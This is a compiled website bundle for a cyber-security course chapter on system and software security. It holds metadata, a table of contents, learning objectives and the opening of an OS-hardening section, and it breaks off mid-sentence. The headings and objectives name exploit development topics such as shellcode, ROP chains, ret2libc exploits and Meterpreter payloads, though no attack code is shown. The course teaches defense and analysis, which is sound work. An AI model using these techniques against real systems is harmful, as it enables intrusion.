"use strict";
(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[1785],{

/***/ 85825
(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  assets: () => (/* binding */ assets),
  contentTitle: () => (/* binding */ contentTitle),
  "default": () => (/* binding */ MDXContent),
  frontMatter: () => (/* binding */ frontMatter),
  metadata: () => (/* reexport */ site_docs_courses_cyber_security_04_system_software_md_652_namespaceObject),
  toc: () => (/* binding */ toc)
});

;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-04-system-software-md-652.json
const site_docs_courses_cyber_security_04_system_software_md_652_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/04-system-software","title":"Chapter 4: System & Software Security","description":"Prereq: Chapter 3 (Network Security) → network perimeter controls limit what reaches the host; this chapter assumes that baseline.","source":"@site/docs/courses/cyber-security/04-system-software.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/04-system-software","permalink":"/ai-engineering-journey/cyber-security/04-system-software","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"id":"04-system-software","slug":"/cyber-security/04-system-software","title":"Chapter 4: System & Software Security","sidebar_label":"Chapter 4: System & Software Security","sidebar_position":4},"sidebar":"course-cyber-security","previous":{"title":"Chapter 3: Network Security","permalink":"/ai-engineering-journey/cyber-security/03-network-security"},"next":{"title":"Chapter 5: Web Security","permalink":"/ai-engineering-journey/cyber-security/05-web-security"}}');
// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
var jsx_runtime = __webpack_require__(74848);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(28453);
;// ./docs/courses/cyber-security/04-system-software.md


const frontMatter = {
	id: '04-system-software',
	slug: '/cyber-security/04-system-software',
	title: 'Chapter 4: System & Software Security',
	sidebar_label: 'Chapter 4: System & Software Security',
	sidebar_position: 4
};
const contentTitle = 'Chapter 4: System & Software Security';

const assets = {

};



const toc = [{
  "value": "Learning Objectives",
  "id": "learning-objectives",
  "level": 2
}, {
  "value": "Architecture Overview",
  "id": "architecture-overview",
  "level": 2
}, {
  "value": "Section 1: Operating System Hardening",
  "id": "section-1-operating-system-hardening",
  "level": 2
}, {
  "value": "1.1 OS Hardening Philosophy",
  "id": "11-os-hardening-philosophy",
  "level": 3
}, {
  "value": "1.2 Linux Hardening",
  "id": "12-linux-hardening",
  "level": 3
}, {
  "value": "1.2.1 Kernel Hardening via sysctl",
  "id": "121-kernel-hardening-via-sysctl",
  "level": 4
}, {
  "value": "1.2.2 Service Management",
  "id": "122-service-management",
  "level": 4
}, {
  "value": "1.2.3 SELinux and AppArmor",
  "id": "123-selinux-and-apparmor",
  "level": 4
}, {
  "value": "1.2.4 File Permissions and auditd",
  "id": "124-file-permissions-and-auditd",
  "level": 4
}, {
  "value": "1.2.5 PAM Configuration",
  "id": "125-pam-configuration",
  "level": 4
}, {
  "value": "1.2.6 SSH Hardening",
  "id": "126-ssh-hardening",
  "level": 4
}, {
  "value": "1.2.7 Practical: Lynis System Hardening Audit",
  "id": "127-practical-lynis-system-hardening-audit",
  "level": 4
}, {
  "value": "1.3 Windows Hardening",
  "id": "13-windows-hardening",
  "level": 3
}, {
  "value": "1.3.1 Security Policy (secpol.msc)",
  "id": "131-security-policy-secpolmsc",
  "level": 4
}, {
  "value": "1.3.2 User Account Control (UAC)",
  "id": "132-user-account-control-uac",
  "level": 4
}, {
  "value": "1.3.3 Windows Defender Configuration",
  "id": "133-windows-defender-configuration",
  "level": 4
}, {
  "value": "1.3.4 AppLocker Configuration",
  "id": "134-applocker-configuration",
  "level": 4
}, {
  "value": "1.3.5 Patch Management (WSUS)",
  "id": "135-patch-management-wsus",
  "level": 4
}, {
  "value": "1.3.6 Practical: Sysinternals Suite",
  "id": "136-practical-sysinternals-suite",
  "level": 4
}, {
  "value": "1.4 OS Hardening Checklist",
  "id": "14-os-hardening-checklist",
  "level": 3
}, {
  "value": "Section 2: Buffer Overflows",
  "id": "section-2-buffer-overflows",
  "level": 2
}, {
  "value": "2.1 Memory Layout of a Process",
  "id": "21-memory-layout-of-a-process",
  "level": 3
}, {
  "value": "2.2 Stack Buffer Overflow",
  "id": "22-stack-buffer-overflow",
  "level": 3
}, {
  "value": "2.2.1 Anatomy",
  "id": "221-anatomy",
  "level": 4
}, {
  "value": "2.2.2 Vulnerable C Program",
  "id": "222-vulnerable-c-program",
  "level": 4
}, {
  "value": "2.2.3 Stack Frame Layout During Execution",
  "id": "223-stack-frame-layout-during-execution",
  "level": 4
}, {
  "value": "2.2.4 gdb Walkthrough",
  "id": "224-gdb-walkthrough",
  "level": 4
}, {
  "value": "2.2.5 Exploiting → Redirecting to secret_function",
  "id": "225-exploiting--redirecting-to-secret_function",
  "level": 4
}, {
  "value": "2.2.6 Complexity Analysis",
  "id": "226-complexity-analysis",
  "level": 4
}, {
  "value": "2.2.7 A&amp;D Table",
  "id": "227-ad-table",
  "level": 4
}, {
  "value": "2.2.8 Edge Cases",
  "id": "228-edge-cases",
  "level": 4
}, {
  "value": "2.3 Heap Buffer Overflow",
  "id": "23-heap-buffer-overflow",
  "level": 3
}, {
  "value": "2.3.1 Anatomy",
  "id": "231-anatomy",
  "level": 4
}, {
  "value": "2.3.2 Vulnerable C Program",
  "id": "232-vulnerable-c-program",
  "level": 4
}, {
  "value": "2.3.3 Use-After-Free (UAF)",
  "id": "233-use-after-free-uaf",
  "level": 4
}, {
  "value": "2.3.4 Complexity Analysis",
  "id": "234-complexity-analysis",
  "level": 4
}, {
  "value": "2.3.5 A&amp;D Table",
  "id": "235-ad-table",
  "level": 4
}, {
  "value": "2.4 SEH Overflow (Windows)",
  "id": "24-seh-overflow-windows",
  "level": 3
}, {
  "value": "2.4.1 Anatomy",
  "id": "241-anatomy",
  "level": 4
}, {
  "value": "2.5 Buffer Overflow Defenses Comparison",
  "id": "25-buffer-overflow-defenses-comparison",
  "level": 3
}, {
  "value": "Section 3: Shellcode Development",
  "id": "section-3-shellcode-development",
  "level": 2
}, {
  "value": "3.1 What Is Shellcode?",
  "id": "31-what-is-shellcode",
  "level": 3
}, {
  "value": "3.2 Writing Shellcode in Assembly (Linux x86)",
  "id": "32-writing-shellcode-in-assembly-linux-x86",
  "level": 3
}, {
  "value": "3.3 Practical: msfvenom Shellcode Generation",
  "id": "33-practical-msfvenom-shellcode-generation",
  "level": 3
}, {
  "value": "3.4 Shellcode Encoding and Obfuscation",
  "id": "34-shellcode-encoding-and-obfuscation",
  "level": 3
}, {
  "value": "Section 4: Advanced Exploitation Techniques",
  "id": "section-4-advanced-exploitation-techniques",
  "level": 2
}, {
  "value": "4.1 Return-to-libc (ret2libc)",
  "id": "41-return-to-libc-ret2libc",
  "level": 3
}, {
  "value": "4.2 Return-Oriented Programming (ROP)",
  "id": "42-return-oriented-programming-rop",
  "level": 3
}, {
  "value": "4.2.1 Finding Gadgets with ropper",
  "id": "421-finding-gadgets-with-ropper",
  "level": 4
}, {
  "value": "4.2.2 Building a ROP Chain (x86_64)",
  "id": "422-building-a-rop-chain-x86_64",
  "level": 4
}, {
  "value": "4.2.3 Practical: ROPgadget Usage",
  "id": "423-practical-ropgadget-usage",
  "level": 4
}, {
  "value": "4.3 ASLR Bypass",
  "id": "43-aslr-bypass",
  "level": 3
}, {
  "value": "4.3.1 Information Leak Techniques",
  "id": "431-information-leak-techniques",
  "level": 4
}, {
  "value": "4.3.2 ret2plt (ASLR Bypass via PLT)",
  "id": "432-ret2plt-aslr-bypass-via-plt",
  "level": 4
}, {
  "value": "4.3.3 Complexity Analysis",
  "id": "433-complexity-analysis",
  "level": 4
}, {
  "value": "Section 5: Malware Types",
  "id": "section-5-malware-types",
  "level": 2
}, {
  "value": "5.1 Malware Classification",
  "id": "51-malware-classification",
  "level": 3
}, {
  "value": "5.1.1 Virus",
  "id": "511-virus",
  "level": 4
}, {
  "value": "5.1.2 Worm",
  "id": "512-worm",
  "level": 4
}, {
  "value": "5.1.3 Trojan",
  "id": "513-trojan",
  "level": 4
}, {
  "value": "5.1.4 Ransomware",
  "id": "514-ransomware",
  "level": 4
}, {
  "value": "5.1.5 Rootkit",
  "id": "515-rootkit",
  "level": 4
}, {
  "value": "5.1.6 Botnet",
  "id": "516-botnet",
  "level": 4
}, {
  "value": "5.1.7 RAT (Remote Access Trojan)",
  "id": "517-rat-remote-access-trojan",
  "level": 4
}, {
  "value": "5.1.8 Spyware",
  "id": "518-spyware",
  "level": 4
}, {
  "value": "5.1.9 Adware",
  "id": "519-adware",
  "level": 4
}, {
  "value": "5.1.10 Fileless Malware",
  "id": "5110-fileless-malware",
  "level": 4
}, {
  "value": "5.2 Malware Types Comparison Table",
  "id": "52-malware-types-comparison-table",
  "level": 3
}, {
  "value": "5.3 Practical Malware Analysis with ClamAV",
  "id": "53-practical-malware-analysis-with-clamav",
  "level": 3
}, {
  "value": "5.4 Practical: PEStudio and HashDiff Analysis",
  "id": "54-practical-pestudio-and-hashdiff-analysis",
  "level": 3
}, {
  "value": "Section 6: Secure Software Development Lifecycle",
  "id": "section-6-secure-software-development-lifecycle",
  "level": 2
}, {
  "value": "6.1 SSDLC Phases",
  "id": "61-ssdlc-phases",
  "level": 3
}, {
  "value": "Phase 1: Requirements",
  "id": "phase-1-requirements",
  "level": 4
}, {
  "value": "Phase 2: Design → Threat Modeling",
  "id": "phase-2-design--threat-modeling",
  "level": 4
}, {
  "value": "Phase 3: Implementation → Secure Coding Standards",
  "id": "phase-3-implementation--secure-coding-standards",
  "level": 4
}, {
  "value": "Phase 4: Testing",
  "id": "phase-4-testing",
  "level": 4
}, {
  "value": "Phase 5: Deployment",
  "id": "phase-5-deployment",
  "level": 4
}, {
  "value": "Phase 6: Maintenance",
  "id": "phase-6-maintenance",
  "level": 4
}, {
  "value": "6.2 Secure Coding Practices (C/C++/Java/JS)",
  "id": "62-secure-coding-practices-ccjavajs",
  "level": 3
}, {
  "value": "6.2.1 C/C++",
  "id": "621-cc",
  "level": 4
}, {
  "value": "6.2.2 Java",
  "id": "622-java",
  "level": 4
}, {
  "value": "6.2.3 JavaScript (Node.js and Browser)",
  "id": "623-javascript-nodejs-and-browser",
  "level": 4
}, {
  "value": "Section 7: Fuzzing",
  "id": "section-7-fuzzing",
  "level": 2
}, {
  "value": "7.1 Fuzzing Concepts",
  "id": "71-fuzzing-concepts",
  "level": 3
}, {
  "value": "7.2 Practical: AFL (American Fuzzy Lop)",
  "id": "72-practical-afl-american-fuzzy-lop",
  "level": 3
}, {
  "value": "7.2.1 Setup and Basic Fuzzing",
  "id": "721-setup-and-basic-fuzzing",
  "level": 4
}, {
  "value": "7.2.2 Sample AFL Output",
  "id": "722-sample-afl-output",
  "level": 4
}, {
  "value": "7.2.3 Analyzing a Crash",
  "id": "723-analyzing-a-crash",
  "level": 4
}, {
  "value": "Section 8: Static and Dynamic Analysis",
  "id": "section-8-static-and-dynamic-analysis",
  "level": 2
}, {
  "value": "8.1 Static Analysis (SAST)",
  "id": "81-static-analysis-sast",
  "level": 3
}, {
  "value": "8.1.1 Flawfinder",
  "id": "811-flawfinder",
  "level": 4
}, {
  "value": "8.1.2 RATS (Rough Auditing Tool for Security)",
  "id": "812-rats-rough-auditing-tool-for-security",
  "level": 4
}, {
  "value": "8.2 Dynamic Analysis (DAST)",
  "id": "82-dynamic-analysis-dast",
  "level": 3
}, {
  "value": "8.3 Static vs Dynamic Analysis Comparison",
  "id": "83-static-vs-dynamic-analysis-comparison",
  "level": 3
}, {
  "value": "Section 9: Case Studies",
  "id": "section-9-case-studies",
  "level": 2
}, {
  "value": "9.1 SolarWinds (2020) → Supply Chain Attack",
  "id": "91-solarwinds-2020--supply-chain-attack",
  "level": 3
}, {
  "value": "9.2 NotPetya (2017) → Ransomware/Wiper",
  "id": "92-notpetya-2017--ransomwarewiper",
  "level": 3
}, {
  "value": "9.3 Stuxnet (2010) → From a Code Perspective",
  "id": "93-stuxnet-2010--from-a-code-perspective",
  "level": 3
}, {
  "value": "9.4 Morris Worm (1988) → First Internet Worm",
  "id": "94-morris-worm-1988--first-internet-worm",
  "level": 3
}, {
  "value": "Section 10: Interview Corner",
  "id": "section-10-interview-corner",
  "level": 2
}, {
  "value": "Q1: What is a stack buffer overflow? Explain with stack frame layout.",
  "id": "q1-what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout",
  "level": 3
}, {
  "value": "Q2: How does ASLR work and how can it be bypassed?",
  "id": "q2-how-does-aslr-work-and-how-can-it-be-bypassed",
  "level": 3
}, {
  "value": "Q3: Explain the difference between DEP/NX and how to bypass it.",
  "id": "q3-explain-the-difference-between-depnx-and-how-to-bypass-it",
  "level": 3
}, {
  "value": "Q4: What is a ROP chain? Walk through building one.",
  "id": "q4-what-is-a-rop-chain-walk-through-building-one",
  "level": 3
}, {
  "value": "Q5: How do you find gadgets for a ROP chain?",
  "id": "q5-how-do-you-find-gadgets-for-a-rop-chain",
  "level": 3
}, {
  "value": "Q6: Explain the N+1 problem in ORM (database context), then explain NOP sled (overflow context).",
  "id": "q6-explain-the-n1-problem-in-orm-database-context-then-explain-nop-sled-overflow-context",
  "level": 3
}, {
  "value": "Q7: What is the difference between a virus and a worm?",
  "id": "q7-what-is-the-difference-between-a-virus-and-a-worm",
  "level": 3
}, {
  "value": "Q8: How would you analyze a suspicious binary without running it?",
  "id": "q8-how-would-you-analyze-a-suspicious-binary-without-running-it",
  "level": 3
}, {
  "value": "Q9: What is the Secure Software Development Lifecycle (SSDLC)?",
  "id": "q9-what-is-the-secure-software-development-lifecycle-ssdlc",
  "level": 3
}, {
  "value": "Q10: Explain the SolarWinds attack in terms of the SSDLC.",
  "id": "q10-explain-the-solarwinds-attack-in-terms-of-the-ssdlc",
  "level": 3
}, {
  "value": "Q11: How does a format string vulnerability work?",
  "id": "q11-how-does-a-format-string-vulnerability-work",
  "level": 3
}, {
  "value": "Q12: What tools would you use for Windows malware analysis?",
  "id": "q12-what-tools-would-you-use-for-windows-malware-analysis",
  "level": 3
}, {
  "value": "Applications in Real Systems",
  "id": "applications-in-real-systems",
  "level": 2
}, {
  "value": "Practical Takeaways",
  "id": "practical-takeaways",
  "level": 2
}, {
  "value": "Summary",
  "id": "summary",
  "level": 2
}, {
  "value": "Exercises",
  "id": "exercises",
  "level": 2
}, {
  "value": "Review Questions",
  "id": "review-questions",
  "level": 3
}, {
  "value": "Application Problems",
  "id": "application-problems",
  "level": 3
}, {
  "value": "Challenge Problem",
  "id": "challenge-problem",
  "level": 3
}, {
  "value": "OS Hardening Checklist",
  "id": "os-hardening-checklist",
  "level": 3
}, {
  "value": "Buffer Overflow Defenses Comparison",
  "id": "buffer-overflow-defenses-comparison",
  "level": 3
}, {
  "value": "Malware Types Comparison Table",
  "id": "malware-types-comparison-table",
  "level": 3
}, {
  "value": "Static vs Dynamic Analysis",
  "id": "static-vs-dynamic-analysis",
  "level": 3
}, {
  "value": "SSDLC Phases",
  "id": "ssdlc-phases",
  "level": 3
}, {
  "value": "TypeScript Implementations",
  "id": "typescript-implementations",
  "level": 2
}, {
  "value": "1. Buffer Overflow Detector",
  "id": "1-buffer-overflow-detector",
  "level": 3
}, {
  "value": "2. Malware Behavior Classifier",
  "id": "2-malware-behavior-classifier",
  "level": 3
}, {
  "value": "Mermaid Diagrams",
  "id": "mermaid-diagrams",
  "level": 2
}, {
  "value": "1. Buffer Overflow Attack Process",
  "id": "1-buffer-overflow-attack-process",
  "level": 3
}, {
  "value": "2. Secure Software Development Lifecycle (SSDLC)",
  "id": "2-secure-software-development-lifecycle-ssdlc",
  "level": 3
}, {
  "value": "Chapter Quiz",
  "id": "chapter-quiz",
  "level": 2
}, {
  "value": "Extended Interview Corner (Q13–Q20)",
  "id": "extended-interview-corner-q13q20",
  "level": 2
}, {
  "value": "Q13: Explain heap spraying as an exploitation technique.",
  "id": "q13-explain-heap-spraying-as-an-exploitation-technique",
  "level": 3
}, {
  "value": "Q14: What is the difference between staged and stageless shellcode?",
  "id": "q14-what-is-the-difference-between-staged-and-stageless-shellcode",
  "level": 3
}, {
  "value": "Q15: How does ASLR differ between 32-bit and 64-bit Linux?",
  "id": "q15-how-does-aslr-differ-between-32-bit-and-64-bit-linux",
  "level": 3
}, {
  "value": "Q16: What is SEHOP and how does SafeSEH differ?",
  "id": "q16-what-is-sehop-and-how-does-safeseh-differ",
  "level": 3
}, {
  "value": "Q17: Explain return-to-libc and when you would use it over a full ROP chain.",
  "id": "q17-explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain",
  "level": 3
}, {
  "value": "Q18: How would you detect a rootkit on a Linux system?",
  "id": "q18-how-would-you-detect-a-rootkit-on-a-linux-system",
  "level": 3
}, {
  "value": "Q19: What is the difference between black-box, white-box, and grey-box fuzzing?",
  "id": "q19-what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing",
  "level": 3
}, {
  "value": "Q20: Explain how the Stuxnet PLC rootkit worked at the code level.",
  "id": "q20-explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level",
  "level": 3
}, {
  "value": "Extended Secure Coding Examples",
  "id": "extended-secure-coding-examples",
  "level": 2
}, {
  "value": "C/C++: Integer Overflow Leading to Buffer Overflow",
  "id": "cc-integer-overflow-leading-to-buffer-overflow",
  "level": 3
}, {
  "value": "Java: XML External Entity (XXE) Prevention",
  "id": "java-xml-external-entity-xxe-prevention",
  "level": 3
}, {
  "value": "Java: Path Traversal Prevention",
  "id": "java-path-traversal-prevention",
  "level": 3
}, {
  "value": "JavaScript: Prototype Pollution Prevention",
  "id": "javascript-prototype-pollution-prevention",
  "level": 3
}, {
  "value": "Node.js: Preventing Command Injection",
  "id": "nodejs-preventing-command-injection",
  "level": 3
}, {
  "value": "Extended Practical: ROP Chain Walkthrough with pwntools",
  "id": "extended-practical-rop-chain-walkthrough-with-pwntools",
  "level": 2
}, {
  "value": "Full Exploit Script for ret2libc with ASLR Bypass",
  "id": "full-exploit-script-for-ret2libc-with-aslr-bypass",
  "level": 3
}, {
  "value": "Explanation of the movaps Stack Alignment Issue",
  "id": "explanation-of-the-movaps-stack-alignment-issue",
  "level": 3
}, {
  "value": "Extended Malware Analysis: Ransomware Encryption Flow",
  "id": "extended-malware-analysis-ransomware-encryption-flow",
  "level": 2
}, {
  "value": "Extended Fuzzing: libFuzzer Example",
  "id": "extended-fuzzing-libfuzzer-example",
  "level": 2
}, {
  "value": "Extended Exploit Development: Shellcode for Windows",
  "id": "extended-exploit-development-shellcode-for-windows",
  "level": 2
}, {
  "value": "Windows x86 MessageBox Shellcode",
  "id": "windows-x86-messagebox-shellcode",
  "level": 3
}, {
  "value": "msfvenom for Windows: Meterpreter Payload",
  "id": "msfvenom-for-windows-meterpreter-payload",
  "level": 3
}, {
  "value": "Extended SSDLC: Threat Modeling Example (STRIDE for Web Application)",
  "id": "extended-ssdlc-threat-modeling-example-stride-for-web-application",
  "level": 2
}, {
  "value": "E-commerce Application Threat Model",
  "id": "e-commerce-application-threat-model",
  "level": 3
}, {
  "value": "Extended Malware Analysis: YARA Rules",
  "id": "extended-malware-analysis-yara-rules",
  "level": 2
}, {
  "value": "Creating YARA Rules for Malware Detection",
  "id": "creating-yara-rules-for-malware-detection",
  "level": 3
}, {
  "value": "Running YARA Scan",
  "id": "running-yara-scan",
  "level": 3
}, {
  "value": "Extended Practical: HashDiff and PE Analysis Walkthrough",
  "id": "extended-practical-hashdiff-and-pe-analysis-walkthrough",
  "level": 2
}, {
  "value": "Complete PE Analysis Workflow",
  "id": "complete-pe-analysis-workflow",
  "level": 3
}, {
  "value": "Extended Edge Cases and Corner Cases",
  "id": "extended-edge-cases-and-corner-cases",
  "level": 2
}, {
  "value": "Buffer Overflow Edge Cases",
  "id": "buffer-overflow-edge-cases",
  "level": 3
}, {
  "value": "Malware Edge Cases",
  "id": "malware-edge-cases",
  "level": 3
}, {
  "value": "Extended NOP Sled and Shellcode Encoding Variants",
  "id": "extended-nop-sled-and-shellcode-encoding-variants",
  "level": 2
}, {
  "value": "NOP Sled Variations",
  "id": "nop-sled-variations",
  "level": 3
}, {
  "value": "Shellcode Encoding with Custom XOR",
  "id": "shellcode-encoding-with-custom-xor",
  "level": 3
}, {
  "value": "Extended Malware Defenses Comparison",
  "id": "extended-malware-defenses-comparison",
  "level": 2
}, {
  "value": "Extended ROP Gadget Catalog (x86_64)",
  "id": "extended-rop-gadget-catalog-x86_64",
  "level": 2
}, {
  "value": "Essential Gadgets for ROP Chains",
  "id": "essential-gadgets-for-rop-chains",
  "level": 3
}, {
  "value": "Finding Specific Gadgets with ropper",
  "id": "finding-specific-gadgets-with-ropper",
  "level": 3
}, {
  "value": "Stack Alignment (movaps) Workaround",
  "id": "stack-alignment-movaps-workaround",
  "level": 3
}, {
  "value": "Extended Malware Analysis: Memory-Only Malware Detection",
  "id": "extended-malware-analysis-memory-only-malware-detection",
  "level": 2
}, {
  "value": "Detecting Reflective DLL Injection",
  "id": "detecting-reflective-dll-injection",
  "level": 3
}, {
  "value": "AMSI Bypass Detection",
  "id": "amsi-bypass-detection",
  "level": 3
}, {
  "value": "Extended Vulnerability Classes and CWE Mapping",
  "id": "extended-vulnerability-classes-and-cwe-mapping",
  "level": 2
}, {
  "value": "Extended ASLR Entropy Details",
  "id": "extended-aslr-entropy-details",
  "level": 2
}, {
  "value": "Linux ASLR Entropy by Architecture and Kernel Version",
  "id": "linux-aslr-entropy-by-architecture-and-kernel-version",
  "level": 3
}, {
  "value": "ASLR Effectiveness on Different Platforms",
  "id": "aslr-effectiveness-on-different-platforms",
  "level": 3
}, {
  "value": "Extended Secure Coding: C/C++ Memory Safety Checklist",
  "id": "extended-secure-coding-cc-memory-safety-checklist",
  "level": 2
}, {
  "value": "Pre-Coding Decisions",
  "id": "pre-coding-decisions",
  "level": 3
}, {
  "value": "During Implementation",
  "id": "during-implementation",
  "level": 3
}, {
  "value": "Code Review Checklist",
  "id": "code-review-checklist",
  "level": 3
}, {
  "value": "Extended Threat Modeling: PASTA Process",
  "id": "extended-threat-modeling-pasta-process",
  "level": 2
}, {
  "value": "PASTA 7-Stage Threat Modeling",
  "id": "pasta-7-stage-threat-modeling",
  "level": 3
}, {
  "value": "Extended Fuzzing: Crash Triaging with GDB",
  "id": "extended-fuzzing-crash-triaging-with-gdb",
  "level": 2
}, {
  "value": "Comprehensive Configuration Hardening Files",
  "id": "comprehensive-configuration-hardening-files",
  "level": 2
}, {
  "value": "Linux: Complete sysctl Hardening",
  "id": "linux-complete-sysctl-hardening",
  "level": 3
}, {
  "value": "Windows: PowerShell Hardening Script",
  "id": "windows-powershell-hardening-script",
  "level": 3
}, {
  "value": "Extended Malware Case Study: Emotet → Botnet Evolution",
  "id": "extended-malware-case-study-emotet--botnet-evolution",
  "level": 2
}, {
  "value": "Emotet Technical Breakdown",
  "id": "emotet-technical-breakdown",
  "level": 3
}, {
  "value": "Extended Buffer Overflow: Stack Frame Diagrams with More Detail",
  "id": "extended-buffer-overflow-stack-frame-diagrams-with-more-detail",
  "level": 2
}, {
  "value": "Complete Stack Frame for x86 (32-bit)",
  "id": "complete-stack-frame-for-x86-32-bit",
  "level": 3
}, {
  "value": "Chapter 4 End",
  "id": "chapter-4-end",
  "level": 2
}];
function _createMdxContent(props) {
  const _components = {
    annotation: "annotation",
    blockquote: "blockquote",
    code: "code",
    details: "details",
    em: "em",
    h1: "h1",
    h2: "h2",
    h3: "h3",
    h4: "h4",
    header: "header",
    hr: "hr",
    input: "input",
    li: "li",
    math: "math",
    mi: "mi",
    mn: "mn",
    mo: "mo",
    mrow: "mrow",
    ol: "ol",
    p: "p",
    pre: "pre",
    semantics: "semantics",
    span: "span",
    strong: "strong",
    summary: "summary",
    table: "table",
    tbody: "tbody",
    td: "td",
    th: "th",
    thead: "thead",
    tr: "tr",
    ul: "ul",
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
    children: [(0,jsx_runtime.jsx)(_components.header, {
      children: (0,jsx_runtime.jsx)(_components.h1, {
        id: "chapter-4-system--software-security",
        children: "Chapter 4: System & Software Security"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Prereq:"
        }), " Chapter 3 (Network Security) → network perimeter controls limit what reaches the host; this chapter assumes that baseline.\n", (0,jsx_runtime.jsx)(_components.strong, {
          children: "Next:"
        }), " Chapter 5 (Web Security) → web applications depend on the OS and software security discussed here."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "learning-objectives",
      children: "Learning Objectives"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Analyze and exploit stack/heap/SEH buffer overflows at the assembly level."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Configure OS hardening on Linux (Lynis, SELinux, sysctl) and Windows (AppLocker, Defender, secpol)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Develop and encode shellcode using msfvenom and assembly."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Build ROP chains and ret2libc payloads to bypass DEP/NX."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Understand ASLR, DEP/NX, CFG, SEHOP, and stack canaries in depth."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Classify malware families (virus, worm, trojan, ransomware, rootkit, botnet, RAT, spyware, adware, fileless)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Apply the SSDLC with threat modeling (STRIDE, DREAD, PASTA) and secure coding standards."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Perform fuzzing with AFL and static analysis with Flawfinder/RATS."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Analyze real malware with PEStudio, HashDiff, ClamAV, and Sysinternals."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "architecture-overview",
      children: "Architecture Overview"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TB\n    subgraph Attacks\n        A1[Stack Overflow]\n        A2[Heap Overflow]\n        A3[SEH Overflow]\n        A4[ROP / ret2libc]\n    end\n    subgraph Defenses\n        D1[ASLR]\n        D2[DEP / NX]\n        D3[Stack Canary]\n        D4[CFG]\n        D5[SEHOP]\n    end\n    subgraph Malware\n        M1[Virus / Worm]\n        M2[Trojan / RAT]\n        M3[Ransomware]\n        M4[Rootkit / Bootkit]\n        M5[Fileless]\n    end\n    subgraph Process\n        P1[SSDLC]\n        P2[Threat Model]\n        P3[Secure Coding]\n        P4[Fuzzing]\n        P5[SAST / DAST]\n    end\n    Attacks -->|bypass| Defenses\n    Defenses -->|prevent| M1\n    M1 --> P1\n    P2 --> P3 --> P4 --> P5\n    style Attacks fill:#fce4ec\n    style Defenses fill:#e1f5fe\n    style Malware fill:#fff3e0\n    style Process fill:#c8e6c9\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "One-Sentence Takeaway:"
        }), " System security requires understanding low-level memory corruption at the assembly level, hardening the OS, classifying malware by behavior, integrating security into the SDLC, and applying both static and dynamic analysis tools."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-1-operating-system-hardening",
      children: "Section 1: Operating System Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "11-os-hardening-philosophy",
      children: "1.1 OS Hardening Philosophy"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Hardening an OS is like preparing a warship for battle. You remove unnecessary furniture (services), seal unused hatches (ports), reinforce the hull (kernel parameters), install fire doors (firewall), and train the crew (policies). Every exposed surface is a liability."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Reduce the attack surface by eliminating every service, port, permission, and feature not explicitly required for the system's mission."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Principle of Least Privilege:"
      }), " Every process and user runs with the minimum permissions necessary. A web server does not need root; a database does not need to compile code."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Defense in Depth:"
      }), " OS hardening is one layer. Combine with firewalls, IDS, EDR, application whitelisting, and user training."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "12-linux-hardening",
      children: "1.2 Linux Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "121-kernel-hardening-via-sysctl",
      children: "1.2.1 Kernel Hardening via sysctl"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["The Linux kernel exposes hundreds of runtime parameters through ", (0,jsx_runtime.jsx)(_components.code, {
